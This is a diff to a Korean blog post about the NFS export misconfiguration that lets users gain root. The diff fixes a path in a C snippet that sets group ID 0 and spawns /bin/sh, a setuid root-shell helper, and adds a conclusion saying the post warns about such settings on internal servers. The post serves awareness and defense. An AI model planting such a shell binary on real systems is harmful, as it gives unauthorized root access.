@@ -32,7 +32,7 @@ NFS 서버의 설정 파일인 `/etc/exports` 파일에서는 NFS export 할 경
        setgid(0);
 
        close(0);
-       open("//dev/tty", O_RDWR);
+       open("/dev/tty", O_RDWR);
 
        system("/bin/sh");
        return 0;
@@ -107,3 +107,6 @@ $ cat /etc/exports
    $ sudo touch core
    $ sudo chmod 666 core
    ```
+
+## 맺음말
+위와 같이 NFS 서버는 설정에 따라 중대한 보안 위협이 있을 수 있다. 그런데 일부 사내 개발 서버들이 이런 위험한 NFS 설정 상태로 되어 있어서😨, 그 위험성을 알리고자 간단히 포스팅한다.
